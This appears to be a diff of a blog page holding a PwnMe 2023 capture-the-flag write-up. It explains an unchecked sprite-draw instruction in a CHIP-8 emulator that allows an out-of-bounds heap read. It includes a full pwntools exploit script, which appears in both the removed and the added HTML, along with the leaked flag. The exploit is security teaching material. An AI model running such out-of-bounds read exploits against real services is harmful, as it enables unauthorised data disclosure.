+<figure class="highlight plaintext"><figcaption><span>or addr - A 12-bit value, the lowest 12 bits of the instruction</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n or nibble - A 4-bit value, the lowest 4 bits of the instruction</span><br><span class="line">x - A 4-bit value, the lower 4 bits of the high byte of the instruction</span><br><span class="line">y - A 4-bit value, the upper 4 bits of the low byte of the instruction</span><br><span class="line">kk or byte - An 8-bit value, the lowest 8 bits of the instruction </span><br></pre></td></tr></table></figure>
 
-<span class="c1"># this exploit was generated via</span>
-<span class="c1"># 1) pwntools</span>
-<span class="c1"># 2) ctfmate</span>
+<h2 id="The-bug"><a href="#The-bug" class="headerlink" title="The bug"></a>The bug</h2><p>The bug lies into the implementation around the instruction that use the <code>I</code> register. Indeed, as you read above, the <code>I</code> register is 16 bits wide. Thus we could we print onto the screen with the help of the <code>DRW</code> instruction data stored from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>. Let’s see how does it  handle the <code>DRW</code> instruction:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://github.com/LakshyAAAgrawal/chip8emu/blob/master/src/Machine.cpp#L123</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0xd000</span>, [this](<span class="type">uint16_t</span>&amp; op)&#123; <span class="comment">// TODO - Dxyn - DRW Vx, Vy, nibble</span></span><br><span class="line">    registers[<span class="number">0xf</span>] = ge.draw_sprite(memory.begin() + I, memory.begin() + I + (op &amp; <span class="number">0x000f</span>), registers[(op &amp; <span class="number">0x0f00</span>)&gt;&gt;<span class="number">8</span>] % <span class="number">0x40</span>, registers[(op &amp; <span class="number">0x00f0</span>)&gt;&gt;<span class="number">4</span>] % <span class="number">0x20</span>);</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">pwn</span>
+<p>The first and the second argument are the begin and the end of the location where data to print are stored. <code>(op &amp; 0x000f)</code> represents the amount of bytes we’d like to print. As you can see no checks are performed, this way we able to get a read out of bound from from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Now we now how we could exfiltrate the flag we can write this tiny chip8 program:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code = [</span><br><span class="line">    <span class="number">0xAFFF</span>, <span class="comment"># Annn - LD I, addr, I  = 0xfff</span></span><br><span class="line">    <span class="number">0x6111</span>, <span class="comment"># 6xkk - LD Vx, byte, R1 = 0x11</span></span><br><span class="line">    <span class="number">0xF11E</span>, <span class="comment"># ADD I, R1, I =&gt; 0x1010</span></span><br><span class="line">    <span class="number">0xDBCF</span>  <span class="comment"># Write on screen (xored with current pixels) 15 bytes from I=0x1010</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
-<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;wrapper&#34;</span>
-<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
-<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+<p>We read the flag from <code>memory[0x1010]</code> given <code>memory</code> is adjacent to the <code>flag</code> (<code>memory[0x1000]</code> &#x3D;&#x3D; begin of the chunk <code>flag</code> within the heap), and we add <code>0x10</code> to read the chunk content which is right after the header (prev_sz and chunk_sz). Once we launch it we get:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1337</span><br><span class="line">[*] &#x27;/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/chip8/wrapper&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">╔════════════════════════════════════════════════════════════════╗</span><br><span class="line">║ █ █ ▄▄▄                                                        ║</span><br><span class="line">║ █  ██▀▄                                                        ║</span><br><span class="line">║ █▄▄▄▀▄█                                                        ║</span><br><span class="line">║ █  ▄ ▀▀                                                        ║</span><br><span class="line">║ ▄██   ▀                                                        ║</span><br><span class="line">║  █▄█▀ ▀                                                        ║</span><br><span class="line">║ ▀▄█▀▀██                                                        ║</span><br><span class="line">║ ▀▀ ▀▀ ▀                                                        ║</span><br></pre></td></tr></table></figure>
 
-<span class="c1"># Set up pwntools for the correct architecture</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
-<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
-<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
-<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
-<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
-<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
-<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
-<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
-<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
-<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+<p>If we decode chars by hand (each byte is a line for which white is 1 and black zero), we get:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">╔════════════════════════════════════════════════════════════════╗</span><br><span class="line">║ █ █ ▄▄▄                                                        ║PW</span><br><span class="line">║ █  ██▀▄                                                        ║NM</span><br><span class="line">║ █▄▄▄▀▄█                                                        ║E&#123;</span><br><span class="line">║ █  ▄ ▀▀                                                        ║CH</span><br><span class="line">║ ▄██   ▀                                                        ║18</span><br><span class="line">║  █▄█▀ ▀                                                        ║-8</span><br><span class="line">║ ▀▄█▀▀██                                                        ║_3</span><br><span class="line">║ ▀▀ ▀▀ ▀                                                         m</span><br></pre></td></tr></table></figure>
 
-<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
-<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">io</span>
-
-
-<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
-
-
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
-</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
-
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">endianness</span> <span class="o">=</span> <span class="s1">&#39;big&#39;</span>
-
-<span class="n">STEP</span><span class="o">=</span><span class="mi">0</span>
-
-<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-
-    <span class="c1"># every registers are zero-ed at the begin of the program</span>
-    <span class="n">code</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="mh">0xAFFF</span><span class="p">,</span> <span class="c1"># Annn - LD I, addr, I  = 0xfff</span>
-		<span class="mh">0x6111</span> <span class="o">+</span> <span class="mh">0xf</span><span class="o">*</span><span class="n">STEP</span><span class="p">,</span> <span class="c1"># 6xkk - LD Vx, byte, R1 = 0x1F</span>
-        <span class="mh">0xF11E</span><span class="p">,</span> <span class="c1"># ADD I, R1, I =&gt; 0x101F</span>
-		<span class="mh">0xDBCF</span>  <span class="c1"># Write on screen (xored with current pixels) 15 bytes from I</span>
-    <span class="p">]</span>
-
-    <span class="n">code_to_send</span> <span class="o">=</span> <span class="p">[</span><span class="n">pwn</span><span class="o">.</span><span class="n">p16</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">code</span><span class="p">]</span>
-
-    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter ROM code: &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">code_to_send</span><span class="p">))</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-
-    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-
-    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-    <span class="n">exp</span><span class="p">()</span>
-
-<span class="s2">&#34;&#34;&#34;
-</span><span class="s2">PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}
-</span><span class="s2">╔════════════════════════════════════════════════════════════════╗
-</span><span class="s2">║ █ █ ▄▄▄                                                        ║PW
-</span><span class="s2">║ █  ██▀▄                                                        ║NM
-</span><span class="s2">║ █▄▄▄▀▄█                                                        ║E{
-</span><span class="s2">║ █  ▄ ▀▀                                                        ║CH
-</span><span class="s2">║ ▄██   ▀                                                        ║18
-</span><span class="s2">║  █▄█▀ ▀                                                        ║-8
-</span><span class="s2">║ ▀▄█▀▀██                                                        ║_3
-</span><span class="s2">║ ▀▀ ▀▀ ▀                                                         m
-</span><span class="s2">
-</span><span class="s2">second part
-</span><span class="s2">╔════════════════════════════════════════════════════════════════╗
-</span><span class="s2">║ ██▄▀█ █                                                        ║mu
-</span><span class="s2">║  ██ ▄ ▀                                                        ║14
-</span><span class="s2">║ ▀██ ▀                                                          ║t0
-</span><span class="s2">║ █▀█▄▄█▄                                                        ║r_
-</span><span class="s2">║ ▄██  ▄█                                                        ║1s
-</span><span class="s2">║ █▄▀█▀▀▀                                                        ║_h
-</span><span class="s2">║ ▄▀▀ ▀▄▄                                                        ║4C
-</span><span class="s2">║ ▀▀ ▀ ▀▀                                                        ║k
-</span><span class="s2">
-</span><span class="s2">part three:
-</span><span class="s2">════════════════════════════════════════════════════════════════╗
-</span><span class="s2">║ ▄█▀ ▀▄                                                         ║4b
-</span><span class="s2">║ ▀█▄▀▀▄▄                                                        ║l3
-</span><span class="s2">║ ▀▄█▀▀▀█                                                        ║_1
-</span><span class="s2">║ █▀▄███▄                                                        ║n_
-</span><span class="s2">║  ██  ▀                                                         ║20
-</span><span class="s2">║  ██  █▄                                                        ║23
-</span><span class="s2">║ █▄██▀▀█                                                        ║_y
-</span><span class="s2">║  ▀▀  ▀▀                                                         3
-</span><span class="s2">
-</span><span class="s2">part four
-</span><span class="s2">
-</span><span class="s2">║ ▄█▀▄▀                                                          ║4h
-</span><span class="s2">║ ▀▀▀▀▀ ▀                                                        ║}
-</span><span class="s2">
-</span><span class="s2">
-</span><span class="s2">&#34;&#34;&#34;</span>
-</code></pre></div>
-    </section>
-  </article>
-
-      </main>
-
-      <footer class="gblog-footer">
-  <nav class="container flex">
-    <div>
-      <section class="flex flex-wrap align-center">
-        
-          <span class="gblog-footer__item gblog-footer__item--row">
-            <svg class="icon gblog_rss_feed"><use xlink:href="#gblog_rss_feed"></use></svg>
-            <a href="/feed.xml" class="gblog-footer__link">Atom Feed</a>
-          </span>
-        
-        
-          
-
-  
-  
-  
-
-  
-    
-      
-      
-      
-
-      
-        <span class="gblog-footer__item gblog-footer__item--row">
-          
-            <svg class="icon gblog_email"><use xlink:href="#gblog_email"></use></svg>
-          
-          <a
-            href="
-              /
-            "
-            class="gblog-footer__link"
-          >
-            Contact
-          </a>
-        </span>
-      
-    
-  
-
-
-
-
-
+<p>If we repeat this step 4 times (by incrementing the value of V1), we finally managed to get the flag: <code>PWNME&#123;CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h&#125;</code>.</p>
+<h2 id="Full-exploit"><a href="#Full-exploit" class="headerlink" title="Full exploit"></a>Full exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;wrapper&quot;</span></span><br><span class="line">LIBC = <span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">LD = <span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(BINARY)</span><br><span class="line">libc = pwn.ELF(LIBC)</span><br><span class="line">ld = pwn.ELF(LD)</span><br><span class="line">pwn.context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line">p64 = pwn.p64</span><br><span class="line">u64 = pwn.u64</span><br><span class="line">p32 = pwn.p32</span><br><span class="line">u32 = pwn.u32</span><br><span class="line">p16 = pwn.p16</span><br><span class="line">u16 = pwn.u16</span><br><span class="line">p8  = pwn.p8</span><br><span class="line">u8  = pwn.u8</span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source ~/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">pwn.context.endianness = <span class="string">&#x27;big&#x27;</span></span><br><span class="line"></span><br><span class="line">STEP=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    io = start()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># every registers are zero-ed at the begin of the program</span></span><br><span class="line">    code = [</span><br><span class="line">        <span class="number">0xAFFF</span>, <span class="comment"># Annn - LD I, addr, I  = 0xfff</span></span><br><span class="line">		<span class="number">0x6111</span> + <span class="number">0xf</span>*STEP, <span class="comment"># 6xkk - LD Vx, byte, R1 = 0x1F</span></span><br><span class="line">        <span class="number">0xF11E</span>, <span class="comment"># ADD I, R1, I =&gt; 0x101F</span></span><br><span class="line">		<span class="number">0xDBCF</span>  <span class="comment"># Write on screen (xored with current pixels) 15 bytes from I</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    code_to_send = [pwn.p16(k) <span class="keyword">for</span> k <span class="keyword">in</span> code]</span><br><span class="line"></span><br><span class="line">    io.sendafter(<span class="string">b&quot;Enter ROM code: &quot;</span>, <span class="string">b&quot;&quot;</span>.join(code_to_send))</span><br><span class="line">    io.sendline(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">PWNME&#123;CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h&#125;</span></span><br><span class="line"><span class="string">╔════════════════════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">║ █ █ ▄▄▄                                                        ║PW</span></span><br><span class="line"><span class="string">║ █  ██▀▄                                                        ║NM</span></span><br><span class="line"><span class="string">║ █▄▄▄▀▄█                                                        ║E&#123;</span></span><br><span class="line"><span class="string">║ █  ▄ ▀▀                                                        ║CH</span></span><br><span class="line"><span class="string">║ ▄██   ▀                                                        ║18</span></span><br><span class="line"><span class="string">║  █▄█▀ ▀                                                        ║-8</span></span><br><span class="line"><span class="string">║ ▀▄█▀▀██                                                        ║_3</span></span><br><span class="line"><span class="string">║ ▀▀ ▀▀ ▀                                                         m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">second part</span></span><br><span class="line"><span class="string">╔════════════════════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">║ ██▄▀█ █                                                        ║mu</span></span><br><span class="line"><span class="string">║  ██ ▄ ▀                                                        ║14</span></span><br><span class="line"><span class="string">║ ▀██ ▀                                                          ║t0</span></span><br><span class="line"><span class="string">║ █▀█▄▄█▄                                                        ║r_</span></span><br><span class="line"><span class="string">║ ▄██  ▄█                                                        ║1s</span></span><br><span class="line"><span class="string">║ █▄▀█▀▀▀                                                        ║_h</span></span><br><span class="line"><span class="string">║ ▄▀▀ ▀▄▄                                                        ║4C</span></span><br><span class="line"><span class="string">║ ▀▀ ▀ ▀▀                                                        ║k</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">part three:</span></span><br><span class="line"><span class="string">════════════════════════════════════════════════════════════════╗</span></span><br><span class="line"><span class="string">║ ▄█▀ ▀▄                                                         ║4b</span></span><br><span class="line"><span class="string">║ ▀█▄▀▀▄▄                                                        ║l3</span></span><br><span class="line"><span class="string">║ ▀▄█▀▀▀█                                                        ║_1</span></span><br><span class="line"><span class="string">║ █▀▄███▄                                                        ║n_</span></span><br><span class="line"><span class="string">║  ██  ▀                                                         ║20</span></span><br><span class="line"><span class="string">║  ██  █▄                                                        ║23</span></span><br><span class="line"><span class="string">║ █▄██▀▀█                                                        ║_y</span></span><br><span class="line"><span class="string">║  ▀▀  ▀▀                                                         3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">part four</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">║ ▄█▀▄▀                                                          ║4h</span></span><br><span class="line"><span class="string">║ ▀▀▀▀▀ ▀                                                        ║&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
 
         
-        
-        
-      </section>
-      <section class="flex flex-wrap align-center">
-        <span class="gblog-footer__item">
-          Built with <a href="https://gohugo.io/" class="gblog-footer__link">Hugo</a> and
-          <svg class="icon gblog_heart"><use xlink:href="#gblog_heart"></use></svg>
-        </span>
